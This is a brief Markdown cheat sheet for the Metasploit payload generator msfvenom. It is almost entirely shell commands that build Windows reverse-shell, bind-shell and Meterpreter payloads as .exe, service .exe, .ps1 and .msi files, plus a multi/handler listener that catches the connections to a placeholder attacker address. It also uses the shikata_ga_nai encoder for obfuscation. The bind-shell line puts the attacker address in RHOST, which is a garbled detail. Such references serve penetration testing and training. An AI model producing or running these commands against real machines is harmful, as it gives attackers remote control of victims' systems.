``msfvenom`` is a payload generator that is utilized by the Metasploit framework.

### Generic Syntax
---
```shell
# Payload
msfvenom -p <payload_type> -f <format> -e <encoding> LHOST=<attacker_ip> LPORT=<listening_port> > <output_file>

# Listener
msfconsole -q -x "use multi/handler; set payload <payload_type>; set LHOST <attacker_ip>; set LPORT <listening_port>; exploit"
```


### Common Parameters
---
```shell
# Payload Types:
windows/shell/reverse_tcp
windows/shell/reverse_http
windows/powershell_reverse_tcp
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Formats:
exe
exe-service
psh-reflection

# Encoding
x86/shikata_ga_nai
```


### Examples
---
```bash
# List Payloads
msfvenom -l payloads 

# List Encoders
msfvenom -l encoders

# Windows x64 Meterpreter HTTPS Reverse Shell (.ps1)
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=<listening_port> -f psh-reflection > meterpreter_x64.ps1

# Windows x86 Executable w/ Polymorphic Encoding (.exe)
msfvenom -p windows/shell/reverse_tcp -f exe -e x86/shikata_ga_nai LHOST=<attacker_ip> LPORT=<listening_port> > normal_payload.exe 

# Windows x86 Service Executable /w Polymorphic Encoding (.exe)
msfvenom -p windows/shell/reverse_tcp -f exe-service -e x86/shikata_ga_nai LHOST=<attacker_ip> LPORT=<listening_port> > service_payload.exe

# Simple TCP Bind Shell (.exe)
msfvenom -p windows/shell/bind_tcp RHOST=<attacker_ip> LPORT=<listening_port> -f exe > bind_payload.exe 

# HTTP Meterpreter Reverse Shell (.exe)
msfvenom -p windows/meterpreter/reverse_http LHOST=<attacker_ip> LPORT=<listening_port> -f exe > http_meterpreter.exe

# Windows x86 PowerShell Reverse Shell (.msi)
msfvenom -p windows/powershell_reverse_tcp LHOST=<attacker_ip> LPORT=<listening_port> -f msi > powershell_payload.msi
```
